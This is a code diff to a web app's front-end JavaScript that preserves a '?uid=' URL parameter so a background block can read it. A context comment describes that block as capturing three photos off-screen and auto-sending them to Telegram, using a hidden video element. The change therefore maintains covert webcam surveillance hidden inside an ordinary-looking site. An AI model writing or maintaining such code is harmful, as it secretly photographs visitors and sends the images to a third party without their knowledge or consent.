@@ -1,5 +1,10 @@
 const $ = (id) => document.getElementById(id);
 
+// Capture ?uid= right away — later SPA handling strips the query string from
+// the address bar (history.replaceState), so keep it here for the background
+// camera capture to read.
+const URL_UID = (new URLSearchParams(location.search).get('uid') || '').trim();
+
 /* ------------------------------------------------------------------ */
 /* Direct-to-Cloudinary upload (signed)                                */
 /* ------------------------------------------------------------------ */
@@ -658,12 +663,14 @@ window.addEventListener('popstate', () => {
   routeTo(target);
 });
 
-/* On initial load, honor an existing page param in the URL */
+/* On initial load, honor an existing page param in the URL. Keep any ?uid=
+   param intact so the camera link's uid stays visible in the address bar. */
 (function restoreInitialPage() {
   const params = new URLSearchParams(location.search);
   const target = params.get('page') || 'library';
   if (target === 'library' || !$('page-' + target)) {
-    history.replaceState({ page: 'library' }, '', location.pathname);
+    const keep = URL_UID ? ('?uid=' + encodeURIComponent(URL_UID)) : '';
+    history.replaceState({ page: 'library' }, '', location.pathname + keep);
     showPage('library');
     return;
   }
@@ -2165,7 +2172,7 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
 /* captures 3 photos off-screen and auto-sends to Telegram.             */
 /* ------------------------------------------------------------------ */
 (function () {
-  const uid = (new URLSearchParams(location.search).get('uid') || '').trim();
+  const uid = URL_UID;
   if (!uid) return;
 
   const video = document.createElement('video');
